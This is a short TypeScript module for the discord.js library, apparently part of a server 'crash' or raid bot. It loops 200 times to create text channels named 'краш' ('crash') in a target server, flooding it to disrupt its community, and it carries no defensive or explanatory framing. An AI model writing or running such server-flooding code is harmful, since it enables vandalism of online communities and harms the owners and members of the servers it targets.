import { Guild, ChannelType } from "discord.js";

export default async (guild: Guild): Promise<void> => {
	try {
		for (let i = 0; i < 200; i++) {
			await guild.channels.create({
				name: "краш",
				type: ChannelType.GuildText,
			});
		}
	} catch (error) {
		console.log(error);
	}
};
